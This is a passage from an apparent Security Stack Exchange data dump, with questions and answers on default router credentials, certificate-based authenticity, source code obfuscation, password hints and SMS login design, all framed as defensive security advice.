<p>As such, here are a couple of things that an attacker could do with admin access to your router:</p>
<ul>
<li>she could configure your DNS server - this may result in her being able to steal credentials by setting up fake sites and fooling you into thinking that they are legit</li>
<li>she may be able to whitelist a MAC address to your WiFi (if you have MAC filtering enabled) and, along with the WiFi password that she can probably see, allow herself into your wireless network</li>
<li>she may setup dynamic dns so that there's no need to discover your IP everytime she wants to connect to your network from a distance</li>
</ul>
<blockquote>
<p>Can an attacker exploit this even while not connected to my network?</p>
</blockquote>
<p>Usually the credentials are only useful if they can be used on the device which they refer to, which also implies access to the device. However there are cases where direct access to the device is not required (see <a href=""https://security.stackexchange.com/users/4028/ysdx"">ysdx</a>'s answer)</p>
<blockquote>
<p>Does this only pose a risk if an attacker knows my wifi password first?</p>
</blockquote>
<p>No. An attacker may first gain access to any other device in your home network (e.g. your personal computer) and then access the router</p>
","0"
"266033","266033","Why does having default router credentials pose a risk?","<p>When I got to 192.168.0.1/login I am greeted with my router login page and can go change some settings. Now let's say I still have the factory default login something like &quot;admin&quot;, &quot;admin&quot;.</p>
<p>Can an attacker exploit this even while not connected to my network? Does this only pose a risk if an attacker knows my wifi password first?</p>
","1","3","266077","<p>In addition to what has already been said, many router are vulnerable to CSRF and or DNS-rebinding attacks. This means that a malicious remote web server (outside of your LAN) can trick your local browser (inside your LAN) to issue HTTP request against the router. This is especially problematic for HTTP endpoints which are not protected (eg. UPnP endpoints) or are protected using default (or weak) credentials.</p>
<p>References:</p>
<ul>
<li><a href=""https://www.gabriel.urdhr.fr/2020/09/23/dns-rebinding-freebox/"" rel=""nofollow noreferrer"">DNS Rebinding vulnerabilities in Freebox</a></li>
<li><a href=""https://www.darkreading.com/vulnerabilities-threats/popular-home-dsl-routers-at-risk-of-csrf-attack"" rel=""nofollow noreferrer"">Popular Home DSL Routers At Risk Of CSRF Attack</a></li>
<li><a href=""https://www.draytek.co.uk/support/guides/kb-avoiding-csrf-attacks"" rel=""nofollow noreferrer"">DrayTek ~ Avoiding CSRF Attacks</a></li>
</ul>
","1"
"265918","265918","How does a digital certificate prove authenticity?","<p>Imagine the following scenario:</p>
<p>We have Bob that wants to send a message to Alice. Both have a public/private key. Bob uses his private key to sign the digest (hash of the message) with it's private key, and sends along it the plain text message. Alice receives the message, it uses Bobs public key to verify the signature, to verify if the message is from Bob, and it hashes the plain text message and compares the hashes/digests, and if they are the same, it means that the message was not altered with and the message is from Bob.</p>
<p>But the authenticity part is not entirely solid, that is where digital certificates come into place. I'm am failing to see how a digital certificate can proof the message comes from the person Alice expects it to come from. The digital certificate contains the name of Bob, and a public key. But what if a hacker intercepts the message, and has it's own digital certificate with the name &quot;Bob&quot; and his own public key in the certificate?</p>
<p>The question is: How can Alice verify the message comes from the real Bob and not the fake one? And how is the validation exactly done? In real life, I can use a passport to identify myself, that is because my face is unique... but with the information in the certificate, how is that even enough for authenticity?</p>
","1","5","265919","<blockquote>
<p>The digital certificate contains the name of Bob, and a public key.</p>
</blockquote>
<p>And it's signed by a trusted third party, commonly known as a Certificate Authority.</p>
<p>CA's have procedures in place to ensure that only Bob will get a certificate that say's he is Bob, so that no third parties should be able to get one.</p>
","-1"
"265918","265918","How does a digital certificate prove authenticity?","<p>Imagine the following scenario:</p>
<p>We have Bob that wants to send a message to Alice. Both have a public/private key. Bob uses his private key to sign the digest (hash of the message) with it's private key, and sends along it the plain text message. Alice receives the message, it uses Bobs public key to verify the signature, to verify if the message is from Bob, and it hashes the plain text message and compares the hashes/digests, and if they are the same, it means that the message was not altered with and the message is from Bob.</p>
<p>But the authenticity part is not entirely solid, that is where digital certificates come into place. I'm am failing to see how a digital certificate can proof the message comes from the person Alice expects it to come from. The digital certificate contains the name of Bob, and a public key. But what if a hacker intercepts the message, and has it's own digital certificate with the name &quot;Bob&quot; and his own public key in the certificate?</p>
<p>The question is: How can Alice verify the message comes from the real Bob and not the fake one? And how is the validation exactly done? In real life, I can use a passport to identify myself, that is because my face is unique... but with the information in the certificate, how is that even enough for authenticity?</p>
","1","5","265922","<p>In asymmetric cryptography there is a notion of a root of trust.</p>
<p>In OpenPGP for instance it's not terribly uncommon to exchange keys face to face.  And then trust all online communication because it can be verified cryptographically by a key you got when meeting the person face to face.  A trusted contact may even say &quot;This is the public key of so and so who I met in person&quot; in a signed message.  Thus giving a reason to trust it.</p>
<p>In many IOT update schemes the root of trust is a key that was placed in the device at manufacturing time.  If an update comes through and it's signed by a key that is signed by a key that was installed at the factory, well, it's trusted.  Because it can be traced back to the root of trust.</p>
<p>In the broader internet context, this is Certificate Authorities.  A browser installs a set of CA certificates and if a website's certificate can be chained back to a CA it's valid.  A CA is trusted because they haven't been known to do anything out of line.  They only sign a certificate for google.com when google comes asking, and no one else.  CA's that break this trust get removed from browsers root of trust.</p>
<p>So, if one wants to design an asymmetric system, it's best designed with some root of trust that everything can descend from.  Bob knows Alice by exchanging keys face to face or by trusting a central authority to never sign a key as being from Alice when it's not.</p>
","0"
"265918","265918","How does a digital certificate prove authenticity?","<p>Imagine the following scenario:</p>
<p>We have Bob that wants to send a message to Alice. Both have a public/private key. Bob uses his private key to sign the digest (hash of the message) with it's private key, and sends along it the plain text message. Alice receives the message, it uses Bobs public key to verify the signature, to verify if the message is from Bob, and it hashes the plain text message and compares the hashes/digests, and if they are the same, it means that the message was not altered with and the message is from Bob.</p>
<p>But the authenticity part is not entirely solid, that is where digital certificates come into place. I'm am failing to see how a digital certificate can proof the message comes from the person Alice expects it to come from. The digital certificate contains the name of Bob, and a public key. But what if a hacker intercepts the message, and has it's own digital certificate with the name &quot;Bob&quot; and his own public key in the certificate?</p>
<p>The question is: How can Alice verify the message comes from the real Bob and not the fake one? And how is the validation exactly done? In real life, I can use a passport to identify myself, that is because my face is unique... but with the information in the certificate, how is that even enough for authenticity?</p>
","1","5","265924","<p>It does not prove authenticity.</p>
<p>When I applied for a digital certificate as the developer of software I had to send an image of my passport.  Of course it is possible for people to fake such an image.</p>
<p>An entity that controls john.com  can prove it.  For example the certificate authority can send something to john.com or ask for something to be sent from john.com.  Whether you trust john.com depends.  If a business that you trust is named &quot;Jon&quot; and you accessed  john.com you have no assurance that you are dealing with Jon.</p>
","0"
"265918","265918","How does a digital certificate prove authenticity?","<p>Imagine the following scenario:</p>
<p>We have Bob that wants to send a message to Alice. Both have a public/private key. Bob uses his private key to sign the digest (hash of the message) with it's private key, and sends along it the plain text message. Alice receives the message, it uses Bobs public key to verify the signature, to verify if the message is from Bob, and it hashes the plain text message and compares the hashes/digests, and if they are the same, it means that the message was not altered with and the message is from Bob.</p>
<p>But the authenticity part is not entirely solid, that is where digital certificates come into place. I'm am failing to see how a digital certificate can proof the message comes from the person Alice expects it to come from. The digital certificate contains the name of Bob, and a public key. But what if a hacker intercepts the message, and has it's own digital certificate with the name &quot;Bob&quot; and his own public key in the certificate?</p>
<p>The question is: How can Alice verify the message comes from the real Bob and not the fake one? And how is the validation exactly done? In real life, I can use a passport to identify myself, that is because my face is unique... but with the information in the certificate, how is that even enough for authenticity?</p>
","1","5","265925","<p>I'll keep the explanation pretty simple using commonly known examples, in order to avoid complicating things. As such, there are many more details involved, but I won't go into them.</p>
<p>There are two main concepts that you should have in mind:</p>
<ul>
<li><a href=""https://en.wikipedia.org/wiki/Public_key_infrastructure"" rel=""nofollow noreferrer"">Public Key Infrastructure</a>: this is a centralized model where certificates are signed by a trusted third party (called a Certificate Authority - CA). This model is used frequently with TLS certificates that, in turn, are used to secure communication channels (e.g. web/http)</li>
<li><a href=""https://en.wikipedia.org/wiki/Web_of_trust"" rel=""nofollow noreferrer"">Web of Trust</a>: this is a decentralized model where each person has a public and a private key and uses them to communicate with other peers. The public key of each person is not signed by any trusted third party but is exchanged among participants using secure means. This model is mainly used by <a href=""https://en.wikipedia.org/wiki/Pretty_Good_Privacy"" rel=""nofollow noreferrer"">PGP</a> and <a href=""https://gnupg.org/"" rel=""nofollow noreferrer"">GnuPG</a>. One way to let know others of your public key is to upload it to a public key server (e.g. pgp.mit.edu) where others can find it. Another way is go to key exchange venues (parties) where people exchange public keys (old school - I'm not aware whether this still takes place).</li>
</ul>
<p>Here's the trick with the web of trust: if I were to meet you and you gave me your public key, I would sign your key with my private key because I know that your public key is valid. Hence, by me signing it, I vouch for its validity. A third person that knows me and trusts me and my keys, will see that I've signed your key and she will immediately start trusting your key too (transitive trust). This is how the web of trust works.</p>
<p>Now, having in mind all of the above, the answer to your question is the following:</p>
<ul>
<li>In the PKI model, a certificate is coupled with a server's <a href=""https://en.wikipedia.org/wiki/Fully_qualified_domain_name"" rel=""nofollow noreferrer"">FQDN</a> (keeping the concepts simple here for the sake of this explanation). As such, when you get the certificate that is signed by a CA that you trust, you trust the certificate and the certificate refers to a single domain. Since you cannot have two different IPs be assigned the same FQDN (again, keeping things simple), you are certain that you communicate with the expected peer</li>
<li>In the WoT model, a public key is coupled (usually) with a user's email address. Other things that can be put in the public key info are the owner's full name, mobile phone, residence etc. All this info is protected from tampering by using integrity protection (cryptographically secure hashing), so when you use the public key you know that you send messages to the specific email address</li>
</ul>
<p>Whether you trust that email address, the info on the public key or you trust a public key without any of these pieces of info is where the WoT model may fail to protect you from an impersonator.</p>
","1"
"265918","265918","How does a digital certificate prove authenticity?","<p>Imagine the following scenario:</p>
<p>We have Bob that wants to send a message to Alice. Both have a public/private key. Bob uses his private key to sign the digest (hash of the message) with it's private key, and sends along it the plain text message. Alice receives the message, it uses Bobs public key to verify the signature, to verify if the message is from Bob, and it hashes the plain text message and compares the hashes/digests, and if they are the same, it means that the message was not altered with and the message is from Bob.</p>
<p>But the authenticity part is not entirely solid, that is where digital certificates come into place. I'm am failing to see how a digital certificate can proof the message comes from the person Alice expects it to come from. The digital certificate contains the name of Bob, and a public key. But what if a hacker intercepts the message, and has it's own digital certificate with the name &quot;Bob&quot; and his own public key in the certificate?</p>
<p>The question is: How can Alice verify the message comes from the real Bob and not the fake one? And how is the validation exactly done? In real life, I can use a passport to identify myself, that is because my face is unique... but with the information in the certificate, how is that even enough for authenticity?</p>
","1","5","265929","<blockquote>
<blockquote>
<p>But what if a hacker intercepts the message, and has it's own digital certificate with the name &quot;Bob&quot; and his own public key in the certificate?</p>
</blockquote>
</blockquote>
<p>When applied to Internet's PKI - Certificate Authority requires you to prove that you are Bob. For example when you request SSL cert for your website, f.e. from LetsEncrypt, they will ask you to prove that you own that domain, by adding a specific DNS record with specific payload.</p>
<p>Alice derives the root of trust from CA, who verifies Bob's identity and issues his cert, and ensure security of Alice&lt;=&gt;Bob communication.</p>
<p>If Bob got his cert from shady CA (or self-signed), Alice is not going to trust it. if Bob's private key is compromised, then his cert will be in Certificate Revocation List, or it will not pass the Open Certificate Status Protocol check.</p>
","0"
"265858","265858","Code obfuscation and source code repositories","<p>As I understand, code obfuscation is used to make reverse engineering difficult/hard for the adversaries/red team.</p>
<p>Now if I use a source code obfuscator where a .C/.CPP file is used as input and an obfuscated .C/.CPP file is generated, should the source code repository such as GIT/SVN store the plain text.C/.CPP file or obfuscated .C/.CPP file?</p>
<p>Next, if a plain text .C/.CPP file is stored in the repository, any attacker gaining access to the repository system would immediately gain access to IP-protected code or if the code was published in public github <a href=""https://www.securityweek.com/toyota-discloses-data-breach-impacting-source-code-customer-email-addresses%5B1%5D"" rel=""nofollow noreferrer"">by mistake</a>. Is that right?</p>
<p>In the other case, where the obfuscated .C/.CPP files are stored in the version repository system, the development team would face issues such as readability and unmanageable code. Is that correct?</p>
<p>So, what is the best means to protect &amp; store the source code?</p>
","2","4","265859","<blockquote>
<p>So what is the best means to protect &amp; store the source code?</p>
</blockquote>
<p>The &quot;best&quot; is usually a trade-off between how good risks can be addressed without impacting other requirements like usability. And then one would need to find ways on how to mitigate the remaining risks.</p>
<p>In your case this could mean</p>
<ul>
<li>Keep the clean source code in the repository (usability requirement) but protect the code repository against unauthorized access (risk mitigation). How this can be done depends on your specific environment and infrastructure.</li>
<li>Make your implementation not depend on obfuscation for security, i.e. it should be only an additional security layer. How this can be done depends on your specific use case, code base, security requirements, testing and quality assurance capabilities ... This way there is not much harm if the attacker finds out your source code.</li>
</ul>
","0"
"265858","265858","Code obfuscation and source code repositories","<p>As I understand, code obfuscation is used to make reverse engineering difficult/hard for the adversaries/red team.</p>
<p>Now if I use a source code obfuscator where a .C/.CPP file is used as input and an obfuscated .C/.CPP file is generated, should the source code repository such as GIT/SVN store the plain text.C/.CPP file or obfuscated .C/.CPP file?</p>
<p>Next, if a plain text .C/.CPP file is stored in the repository, any attacker gaining access to the repository system would immediately gain access to IP-protected code or if the code was published in public github <a href=""https://www.securityweek.com/toyota-discloses-data-breach-impacting-source-code-customer-email-addresses%5B1%5D"" rel=""nofollow noreferrer"">by mistake</a>. Is that right?</p>
<p>In the other case, where the obfuscated .C/.CPP files are stored in the version repository system, the development team would face issues such as readability and unmanageable code. Is that correct?</p>
<p>So, what is the best means to protect &amp; store the source code?</p>
","2","4","265906","<p>Anyway you do it, a successful attacker will compromise your code base:</p>
<ul>
<li>if you have your code stored in the repository as plain text, an attacker with repository read access can get all your code</li>
<li>if you have your code stored obfuscated in the repository, every developer will need to undo the obfuscation on their workstations (so that they can work on it); an attacker can just gain access to one developer's computer and get the code from there</li>
</ul>
<p>If you have trust issues with your developers then you need to think differently and treat the issue as defending against insider threats. That's a difficult issue to solve outside of a justified environment (e.g. government agencies). However, a start would be to compartmentalize or minimize the access that the developers have to the code. That is, developers should only have access to the code base on which they're working on - there's no reason for them to have access to the whole code base. As such, should someone steal your code, they would only have bits and pieces and not the whole story.</p>
","0"
"265858","265858","Code obfuscation and source code repositories","<p>As I understand, code obfuscation is used to make reverse engineering difficult/hard for the adversaries/red team.</p>
<p>Now if I use a source code obfuscator where a .C/.CPP file is used as input and an obfuscated .C/.CPP file is generated, should the source code repository such as GIT/SVN store the plain text.C/.CPP file or obfuscated .C/.CPP file?</p>
<p>Next, if a plain text .C/.CPP file is stored in the repository, any attacker gaining access to the repository system would immediately gain access to IP-protected code or if the code was published in public github <a href=""https://www.securityweek.com/toyota-discloses-data-breach-impacting-source-code-customer-email-addresses%5B1%5D"" rel=""nofollow noreferrer"">by mistake</a>. Is that right?</p>
<p>In the other case, where the obfuscated .C/.CPP files are stored in the version repository system, the development team would face issues such as readability and unmanageable code. Is that correct?</p>
<p>So, what is the best means to protect &amp; store the source code?</p>
","2","4","266693","<p>In the case of C/CPP you opt for obfuscation in order to make it harder for adversaries to read the source code when the binary artifact is de-compiled.</p>
<p>You don't want to obfuscate the code source your share with you team on repository, unless the development tool-set you have in hand, allows automation of obfuscation/ de-obfsucation.</p>
<p>However, you should plan this step when you build/compile your software for distribution.</p>
","0"
"265858","265858","Code obfuscation and source code repositories","<p>As I understand, code obfuscation is used to make reverse engineering difficult/hard for the adversaries/red team.</p>
<p>Now if I use a source code obfuscator where a .C/.CPP file is used as input and an obfuscated .C/.CPP file is generated, should the source code repository such as GIT/SVN store the plain text.C/.CPP file or obfuscated .C/.CPP file?</p>
<p>Next, if a plain text .C/.CPP file is stored in the repository, any attacker gaining access to the repository system would immediately gain access to IP-protected code or if the code was published in public github <a href=""https://www.securityweek.com/toyota-discloses-data-breach-impacting-source-code-customer-email-addresses%5B1%5D"" rel=""nofollow noreferrer"">by mistake</a>. Is that right?</p>
<p>In the other case, where the obfuscated .C/.CPP files are stored in the version repository system, the development team would face issues such as readability and unmanageable code. Is that correct?</p>
<p>So, what is the best means to protect &amp; store the source code?</p>
","2","4","266713","<blockquote>
<p>In the other case, where the obfuscated .C/.CPP files are stored in
the version repository system, the development team would face issues
such as readability and unmanageable code. Is that correct?</p>
</blockquote>
<p>Yes, Obfuscation simply will not rename the variable name or method name but is also meant to add more logic like adding code flow, adding dummy codes blocks, conversion of String literals into byte code representation, Encryption of hard-coded String literals and de-compiler confusion methods together will make the obfuscation stronger.</p>
<blockquote>
<p>So, what is the best means to protect &amp; store the source code?</p>
</blockquote>
<p>You can configure the obfuscation tool to your compiler to generate the obfuscated binaries. On the other hand, if you really want to encrypt the source code then you can write a script to encrypt the source code contents and just use your favorite SVN to push it to the branch. Again while pull the code, Decrypt the file using same algorithm before importing into the IDE.</p>
","0"
"265857","265857","Is it safe for my password hint to be synonymous to my password?","<p>Lets say my password is <code>AppleDogFire642!</code>.</p>
<p>What would be the potential security consequences if my password hint was <code>BananaCatSmoke123@</code>?</p>
","0","4","265862","<p>If I saw <code>BananaCatSmoke123@</code> and it didn't work, then I would most certainly start replacing words, numbers, and symbols.</p>
<p>You not only give away your pattern, but the context behind each word. You reduce the entropy for the attacker considerably. So instead of <code>Apple</code> providing 5 characters from a 52-symbol set (26 lower-case letters, 26 upper-case), it represents a common fruit, a set of 10-20 options.</p>
<p>So, such a hint makes it considerably easier for someone to guess your password.</p>
","11"
"265857","265857","Is it safe for my password hint to be synonymous to my password?","<p>Lets say my password is <code>AppleDogFire642!</code>.</p>
<p>What would be the potential security consequences if my password hint was <code>BananaCatSmoke123@</code>?</p>
","0","4","265868","<p>A password hint should be just that: A hint.</p>
<p>For example, if you have 3 passwords with high entropy, which you use on systems where using a password manager isn't possible, then the password hint should be something that hints you towards <em>which</em> password you have chosen.</p>
<p>For example, say you have the following three passphrases:</p>
<ul>
<li><code>Legendary Equal Enforcer Stubby Berlin Tower</code></li>
<li><code>Obligatory Sawmill Stoic Landscape Fast Swing</code></li>
<li><code>Seven Key Purple Dreaming Dramazic Queue</code></li>
</ul>
<p>Your password hint could literally be <code>L</code>, <code>O</code>, or <code>S</code> respectively. While yes, it <em>does</em> reveal something about your password, it's merely one letter. The purpose of the hint should be to remind you which of the passwords you had chosen, not what the password is.</p>
","1"
"265857","265857","Is it safe for my password hint to be synonymous to my password?","<p>Lets say my password is <code>AppleDogFire642!</code>.</p>
<p>What would be the potential security consequences if my password hint was <code>BananaCatSmoke123@</code>?</p>
","0","4","265874","<p><strong>No, this is not safe.</strong> Your password hint needs to be useful only to <em>you</em>.</p>
<p>Let's say you change password schemes every once in a while. You could denote not the scheme but the date, so you could say &quot;uses 2022 pw scheme&quot; to remind yourself without actually revealing the scheme. (I actually did this until my last scheme change, which simply tells me to use my password manager. Password managers are the only viable solution here since password strength is inversely proportional to memorability.)</p>
<p>Before I switched to a password manager, I used a prescribed scheme and wrote clues on a note in my wallet. The site hint would simply point me there, like <code>wallet 13</code> to denote the 13th item on the list, which itself was a cryptic clue only I could understand. That would the the appropriate place to write <code>BananaCatSmoke123@</code>.</p>
<p>(I like using my wallet because it's always on me. If somebody is digging through my wallet, that's an obvious invasion of my privacy. This is much better than a sticky note under the keyboard.)</p>
","0"
"265857","265857","Is it safe for my password hint to be synonymous to my password?","<p>Lets say my password is <code>AppleDogFire642!</code>.</p>
<p>What would be the potential security consequences if my password hint was <code>BananaCatSmoke123@</code>?</p>
","0","4","265882","<p>The potential security consequence is that someone can figure out the password, authenticate and steal information or sabotage the person/system. This is not a consequence of the specific approach that you propose, it is a weakness of password-based authentication mechanisms <em>in general</em>.</p>
<p>In your case, the approach seems to be based on people not being able to make any association between the hint and the password. For the average person this may be true, but for a knowledgeable adversary this is usually not the case.</p>
<p>Here are some potential problems I see with your approach:</p>
<ol>
<li>The structures of your password and hint are identical and strict; 3 words, 3 digits and 1 special symbol. This gives a leverage to an adversary, because they know how to construct a password and try it against the authentication system</li>
<li>Assuming that there's an 1-1 correspondence of the words between the hint and the password, the words belong to the same semantic family (animals, fruits etc) which reduces the search space by <em>a lot</em></li>
<li>Assuming that you're using natural language words (e.g. english, as in your example), your password is susceptible to dictionary attacks. Since the hint is public info and provides the families of the words that the password uses, this is a major concern (given point 2 above)</li>
</ol>
<p>The authentication system that is used, also plays a significant role:</p>
<ul>
<li>If it's an offline system (e.g. hard disk encryption) then an adversary can steal it (e.g. make a copy of the encrypted disk) and try as many times as required in order to break in</li>
<li>If it's an online system (e.g. web site) then several factors play their role too:
(a) Does the system restrict the number of failed password attempts?
(b) Does the system use a secure key derivation function to store your password (e.g. argon2)?
(c) If the system is a user authentication system, does it have multi-factor-authentication (MFA) enabled?</li>
</ul>
<p>Finally, the most important question is: what are you trying to protect? Low value, low impact info doesn't require sophisticated protection approaches. Top secret government info requires a lot more than that.</p>
","0"
"265855","265855","Is this a safe system to authenticate users by phone number?","<p>I'm making a Actix-web/Rust web-application where users are solely allowed to register and login with their mobile phone number. The login-screen consists of one input asking for the phone number. If a user with that phone number already exists in the database he gets redirected to the authentication-page, otherwise to the registration page.</p>
<p>The authentication-page has only one input asking for a authentication-code. This code is sent to the user by SMS as soon as he wants to login.</p>
<p>I want to verify that the system I am using is secure and valid.</p>
<p><strong>This is a simplified version of the relevant MySQL tables:</strong>
<a href=""https://i.stack.imgur.com/GtxL3.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/GtxL3.png"" alt=""User authentication table"" /></a></p>
<p><strong>Steps of authentication:</strong></p>
<ol>
<li>The user inputs his phone number in the login-screen.</li>
<li>System checks
and sees that a user with this phone number exists.</li>
<li>In the table <code>UserAuthenticationRequest</code> we insert:
<ul>
<li>The ID of the User trying to authenticate.</li>
<li>A random generated number of 6 ciphers (hashed).</li>
<li>The timestamp of the insert.</li>
<li>The number of guessing attempts for this specific authentication request, default 0.</li>
</ul>
</li>
<li>Random generated number is sent to the phone number of the user through SMS.</li>
<li>User is redirected to the authentication-page where he needs to insert received number.</li>
<li>If the hashes of the given number and the number in the table <code>UserAuthenticationRequest</code> match, the user is authenticated.</li>
<li>If not, the column <code>attempts</code> increases with one.</li>
</ol>
<p><strong>Extra info:</strong></p>
<ul>
<li>In the table <code>UserAuthenticationRequest</code> the column <code>user_id</code> is unique. So for each user there can only be one authentication at the same time,</li>
<li>A MySQL event will be configured to delete all rows older then 15 minutes.</li>
<li>If an authentication has more then 3 attempts the row gets deleted and a new code must be requested.</li>
<li>The authentication is session-bound so the generated number must be inputted in the same browser as in which the request was sent.</li>
</ul>
<p>Is this a safe system to authenticate users?</p>
","1","4","265863","<p>The security weaknesses with SMS are well documented (SS7 attacks, sim-swapping, compromised mobiles, etc), so whether or not this authentication system is &quot;safe&quot; depends on what you threat model is. If this application is used for online banking, the answer is probably &quot;no&quot;; if it's a browser-based game and you're just tracking high scores then the answer might be &quot;yes&quot;.</p>
<p>It's also worth considering that by using SMS for authentication, you're making your application inaccessible to anyone who doesn't have a mobile phone, and also making it so that if someone is unable to receive an SMS at that point in time (not got their phone with them, no signal, flat battery, etc) then they won't be able to login. Storing mobile phone numbers may also have GDPR implications.</p>
","1"
"265855","265855","Is this a safe system to authenticate users by phone number?","<p>I'm making a Actix-web/Rust web-application where users are solely allowed to register and login with their mobile phone number. The login-screen consists of one input asking for the phone number. If a user with that phone number already exists in the database he gets redirected to the authentication-page, otherwise to the registration page.</p>
<p>The authentication-page has only one input asking for a authentication-code. This code is sent to the user by SMS as soon as he wants to login.</p>
<p>I want to verify that the system I am using is secure and valid.</p>
<p><strong>This is a simplified version of the relevant MySQL tables:</strong>
<a href=""https://i.stack.imgur.com/GtxL3.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/GtxL3.png"" alt=""User authentication table"" /></a></p>
<p><strong>Steps of authentication:</strong></p>
<ol>
<li>The user inputs his phone number in the login-screen.</li>
<li>System checks
and sees that a user with this phone number exists.</li>
<li>In the table <code>UserAuthenticationRequest</code> we insert:
<ul>
<li>The ID of the User trying to authenticate.</li>
<li>A random generated number of 6 ciphers (hashed).</li>
<li>The timestamp of the insert.</li>
<li>The number of guessing attempts for this specific authentication request, default 0.</li>
</ul>
</li>
<li>Random generated number is sent to the phone number of the user through SMS.</li>
<li>User is redirected to the authentication-page where he needs to insert received number.</li>
<li>If the hashes of the given number and the number in the table <code>UserAuthenticationRequest</code> match, the user is authenticated.</li>
<li>If not, the column <code>attempts</code> increases with one.</li>
</ol>
<p><strong>Extra info:</strong></p>
<ul>
<li>In the table <code>UserAuthenticationRequest</code> the column <code>user_id</code> is unique. So for each user there can only be one authentication at the same time,</li>
<li>A MySQL event will be configured to delete all rows older then 15 minutes.</li>
<li>If an authentication has more then 3 attempts the row gets deleted and a new code must be requested.</li>
<li>The authentication is session-bound so the generated number must be inputted in the same browser as in which the request was sent.</li>
</ul>
<p>Is this a safe system to authenticate users?</p>
","1","4","265870","<p>I can see which of my friends (or enemies) is using your service by entering each phone number in turn and observing whether you offer an authentication code or display a registration screen.</p>
<p>For this reason, systems of the kind you are proposing usually say to the user, “If you are registered with us, we have just sent you an authentication code; if you aren’t, we haven’t.”</p>
","1"
"265855","265855","Is this a safe system to authenticate users by phone number?","<p>I'm making a Actix-web/Rust web-application where users are solely allowed to register and login with their mobile phone number. The login-screen consists of one input asking for the phone number. If a user with that phone number already exists in the database he gets redirected to the authentication-page, otherwise to the registration page.</p>
<p>The authentication-page has only one input asking for a authentication-code. This code is sent to the user by SMS as soon as he wants to login.</p>
<p>I want to verify that the system I am using is secure and valid.</p>
<p><strong>This is a simplified version of the relevant MySQL tables:</strong>
<a href=""https://i.stack.imgur.com/GtxL3.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/GtxL3.png"" alt=""User authentication table"" /></a></p>
<p><strong>Steps of authentication:</strong></p>
<ol>
<li>The user inputs his phone number in the login-screen.</li>
<li>System checks
and sees that a user with this phone number exists.</li>
<li>In the table <code>UserAuthenticationRequest</code> we insert:
<ul>
<li>The ID of the User trying to authenticate.</li>
<li>A random generated number of 6 ciphers (hashed).</li>
<li>The timestamp of the insert.</li>
<li>The number of guessing attempts for this specific authentication request, default 0.</li>
</ul>
</li>
<li>Random generated number is sent to the phone number of the user through SMS.</li>
<li>User is redirected to the authentication-page where he needs to insert received number.</li>
<li>If the hashes of the given number and the number in the table <code>UserAuthenticationRequest</code> match, the user is authenticated.</li>
<li>If not, the column <code>attempts</code> increases with one.</li>
</ol>
<p><strong>Extra info:</strong></p>
<ul>
<li>In the table <code>UserAuthenticationRequest</code> the column <code>user_id</code> is unique. So for each user there can only be one authentication at the same time,</li>
<li>A MySQL event will be configured to delete all rows older then 15 minutes.</li>
<li>If an authentication has more then 3 attempts the row gets deleted and a new code must be requested.</li>
<li>The authentication is session-bound so the generated number must be inputted in the same browser as in which the request was sent.</li>
</ul>
<p>Is this a safe system to authenticate users?</p>
","1","4","265911","<p>No, it's not safe.</p>
<p>The reason is this:</p>
<blockquote>
<p>If an authentication has more then 3 attempts the row gets deleted and a new code must be requested.</p>
</blockquote>
<p>Although not as straight forward as a brute force attack against a single authentication token, you're still allowing unlimited attempts to authenticate. You should block/disable the account after 3 (or 5) attempts - no one should need more than a couple of tries to enter a number they read from the screen of their phones to the same or another device.</p>
<p>On the fact that you're using a mobile phone to authenticate users, aside from all the issues that others have mentioned, you should have in mind that authentication usually involves:</p>
<ul>
<li><strong>something you know</strong>: usually a password (this is the easiest to implement)</li>
<li><strong>something you have</strong>: usually a security device or your mobile phone</li>
<li><strong>something you are</strong>: biometrics</li>
</ul>
<p>The more steps you involve to the authentication process, the more secure your system is and the more <em>user unfriendly</em> your authentication process is.</p>
<p>Using one way to authenticate (single-factor authentication, <strong>SFA</strong>) is what most people go to, but it's considered very risky by today's standards.
Two-factor authentication (<strong>2FA</strong>) tends to become more common, by using a password and a mobile phone as a second step.
Multi-factor authentication (<strong>MFA</strong>) can employ more advanced methods, such as biometrics.</p>
<p>What you've done is that you've replaced the password authentication with a mobile phone (&quot;something you know&quot; with &quot;something you have&quot;). Although more difficult to break, it's still SFA.</p>
<p>Is it safe? It depends on what you're trying to protect and by whom. Is it for a game account? Yes, it's safe. Is it health records of a hospital? It's probably safe against the average health professional. But it's not safe against knowledgeable adversaries.</p>
","1"
"265855","265855","Is this a safe system to authenticate users by phone number?","<p>I'm making a Actix-web/Rust web-application where users are solely allowed to register and login with their mobile phone number. The login-screen consists of one input asking for the phone number. If a user with that phone number already exists in the database he gets redirected to the authentication-page, otherwise to the registration page.</p>
<p>The authentication-page has only one input asking for a authentication-code. This code is sent to the user by SMS as soon as he wants to login.</p>
<p>I want to verify that the system I am using is secure and valid.</p>
<p><strong>This is a simplified version of the relevant MySQL tables:</strong>
<a href=""https://i.stack.imgur.com/GtxL3.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/GtxL3.png"" alt=""User authentication table"" /></a></p>
<p><strong>Steps of authentication:</strong></p>
<ol>
<li>The user inputs his phone number in the login-screen.</li>
<li>System checks
and sees that a user with this phone number exists.</li>
<li>In the table <code>UserAuthenticationRequest</code> we insert:
<ul>
<li>The ID of the User trying to authenticate.</li>
<li>A random generated number of 6 ciphers (hashed).</li>
<li>The timestamp of the insert.</li>
<li>The number of guessing attempts for this specific authentication request, default 0.</li>
</ul>
</li>
<li>Random generated number is sent to the phone number of the user through SMS.</li>
<li>User is redirected to the authentication-page where he needs to insert received number.</li>
<li>If the hashes of the given number and the number in the table <code>UserAuthenticationRequest</code> match, the user is authenticated.</li>
<li>If not, the column <code>attempts</code> increases with one.</li>
</ol>
<p><strong>Extra info:</strong></p>
<ul>
<li>In the table <code>UserAuthenticationRequest</code> the column <code>user_id</code> is unique. So for each user there can only be one authentication at the same time,</li>
<li>A MySQL event will be configured to delete all rows older then 15 minutes.</li>
<li>If an authentication has more then 3 attempts the row gets deleted and a new code must be requested.</li>
<li>The authentication is session-bound so the generated number must be inputted in the same browser as in which the request was sent.</li>
</ul>
<p>Is this a safe system to authenticate users?</p>
","1","4","265928","<p>By using SMS for auth, you are opening yourself to many threats.</p>
<p>For example any user can spam signup on your page with random phone numbers, leading to mass SMS spam on behalf of your app. That will lead you to spend quite a lot on SMS API provider, and can potentially mark your account as spammer.</p>
